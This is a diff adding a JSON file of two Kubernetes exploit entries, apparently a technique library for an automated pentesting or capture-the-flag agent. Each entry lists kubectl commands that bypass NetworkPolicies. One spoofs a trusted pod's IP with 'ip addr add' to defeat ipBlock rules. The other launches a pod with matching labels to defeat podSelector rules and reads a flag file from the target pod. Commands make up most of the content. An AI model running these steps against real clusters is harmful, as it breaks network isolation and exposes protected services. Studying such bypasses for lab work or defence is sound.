@@ -1,0 +1,92 @@
+[
+  {
+    "id": "k8s-cni-ip-spoofing",
+    "category": "EXPLOIT",
+    "subcategory": "K8s_Networking",
+    "title": "K8s CNI IP Spoofing — NetworkPolicy ipBlock Bypass via Source IP Spoofing (K8S-30)",
+    "description": "Kubernetes NetworkPolicies can restrict traffic by destination CIDR using ipBlock rules. However, these rules check the source IP of each packet, and within a pod's network namespace an attacker can add arbitrary IP aliases to bypass IP-based access controls. Attack: (1) Verify the NetworkPolicy blocks traffic: kubectl exec attacker-pod -- wget -qO- --timeout=3 http://FLAG_SERVICE_IP:8080 (should fail). (2) Discover the allowed CIDR: kubectl get networkpolicy -n trust-zone ip-allowlist -o yaml — note the ipBlock cidr value (e.g., 10.244.1.0/24). (3) Find an allowed pod's IP within the CIDR: TRUSTED_IP=$(kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}'). (4) Add the trusted IP as a secondary address on the attacker pod's interface: kubectl exec attacker-pod -- ip addr add $TRUSTED_IP/32 dev eth0. (5) Access the flag service — the NetworkPolicy now sees the source IP as matching the allowed CIDR: kubectl exec attacker-pod -- wget -qO- http://FLAG_SERVICE_IP:8080 (should succeed). Key insights: (a) CNI-assigned pod IPs are simple Linux network interfaces — ip addr add can create IP aliases within the pod's netns. (b) This bypasses ipBlock-based NetworkPolicies but not podSelector-based ones. (c) The spoofed IP must be unused or belong to a pod that doesn't need the traffic — IP conflicts may disrupt communication. (d) cleanup: ip addr del $TRUSTED_IP/32 dev eth0.",
+    "techniques": [
+      "kubectl get networkpolicy -n NAMESPACE NAME -o yaml",
+      "kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}'",
+      "kubectl exec attacker-pod -- ip addr add SPOOFED_IP/32 dev eth0",
+      "kubectl exec attacker-pod -- wget -qO- http://FLAG_SERVICE:8080",
+      "kubectl exec attacker-pod -- ip addr del SPOOFED_IP/32 dev eth0",
+      "kubectl exec attacker-pod -- ip addr show eth0"
+    ],
+    "indicators": [
+      "NetworkPolicy with ipBlock ingress rule (specific CIDR allowlist)",
+      "Known allowed pod IP within the CIDR range",
+      "Attacker pod can run ip commands (ip addr add)",
+      "Flag service accessible only from allowed CIDR"
+    ],
+    "prerequisites": [
+      "kubectl exec access to attacker pod",
+      "Attacker pod has iproute2 tools (ip command)",
+      "NetworkPolicy uses ipBlock (not podSelector) for ingress control",
+      "Known allowed pod IP or CIDR enumeration"
+    ],
+    "tools": [
+      "kubectl_get_pods",
+      "kubectl_exec",
+      "shell_exec"
+    ],
+    "tags": [
+      "k8s",
+      "cni",
+      "ip-spoofing",
+      "networkpolicy",
+      "bypass",
+      "ipblock",
+      "k8s-30",
+      "source-ip",
+      "spoof"
+    ],
+    "confidence": 0.8,
+    "mitre_attack": "T1205"
+  },
+  {
+    "id": "k8s-networkpolicy-label-spoof",
+    "category": "EXPLOIT",
+    "subcategory": "K8s_Networking",
+    "title": "K8s NetworkPolicy Label Spoofing — podSelector Bypass via Pod Label Manipulation (K8S-27)",
+    "description": "Kubernetes NetworkPolicies using podSelector match pods by their labels. If an attacker can create pods with arbitrary labels, they can bypass network isolation by creating a pod with the required labels in the target namespace — even if their existing pods are blocked by a restrictive NetworkPolicy. Attack: (1) Verify the NetworkPolicy blocks traffic from current pod: kubectl exec attacker-pod -n attacker-ns -- wget -qO- --timeout=3 http://flag-service.isolated-ns.svc.cluster.local:8080/flag (should fail). (2) Discover the NetworkPolicy rules: kubectl get networkpolicy -n isolated-ns protect-flag -o yaml — look for the podSelector matchLabels (e.g., tier: frontend). (3) Create a new pod with the required label in the target namespace: kubectl run bypass-pod --image=alpine:latest -n isolated-ns --labels='tier=frontend' -- sleep 3600. (4) Wait for pod readiness: kubectl wait --for=condition=Ready pod/bypass-pod -n isolated-ns --timeout=30s. (5) Access the flag service from the bypass pod: kubectl exec -n isolated-ns bypass-pod -- wget -qO- http://flag-service:8080/flag. (6) Alternative: directly read from the flag pod: FLAG_POD=$(kubectl get pods -n isolated-ns -l app=flag-service -o jsonpath='{.items[0].metadata.name}'); kubectl exec -n isolated-ns $FLAG_POD -- cat /tmp/flag.txt. Key insights: (a) NetworkPolicy podSelector filtering is based on the pod's labels at creation time — any pod with matching labels is allowed. (b) The attacker does not need to modify existing pods; creating a new pod with the right labels suffices. (c) This works even when the attacker's original pod is in a different namespace — as long as the NetworkPolicy allows pods from any namespace with matching labels.",
+    "techniques": [
+      "kubectl exec attacker-pod -- wget -qO- --timeout=3 http://flag-service.isolated-ns.svc.cluster.local:8080/flag",
+      "kubectl get networkpolicy -n isolated-ns protect-flag -o yaml",
+      "kubectl run bypass-pod --image=alpine:latest -n isolated-ns --labels='tier=frontend' -- sleep 3600",
+      "kubectl wait --for=condition=Ready pod/bypass-pod -n isolated-ns --timeout=30s",
+      "kubectl exec -n isolated-ns bypass-pod -- wget -qO- http://flag-service:8080/flag",
+      "kubectl get pods -n isolated-ns -l app=flag-service -o jsonpath='{.items[0].metadata.name}'",
+      "kubectl exec -n isolated-ns FLAG_POD -- cat /tmp/flag.txt"
+    ],
+    "indicators": [
+      "NetworkPolicy with podSelector ingress rule requiring specific labels",
+      "Flag service in isolated namespace accessible via label matching",
+      "User has pod creation permissions in target namespace",
+      "Existing pod blocked by NetworkPolicy but label requirement discoverable"
+    ],
+    "prerequisites": [
+      "kubectl access with get networkpolicy and create pod permissions",
+      "NetworkPolicy uses podSelector labels (not just namespaceSelector or ipBlock)",
+      "Pod creation permission in the isolated/target namespace",
+      "Knowledge of the label key-value required by the NetworkPolicy"
+    ],
+    "tools": [
+      "kubectl_get_pods",
+      "kubectl_exec",
+      "kubectl_run"
+    ],
+    "tags": [
+      "k8s",
+      "networkpolicy",
+      "label-spoofing",
+      "bypass",
+      "pod-selector",
+      "k8s-27",
+      "network-isolation",
+      "lateral-movement"
+    ],
+    "confidence": 0.85,
+    "mitre_attack": "T1205"
+  }
+]
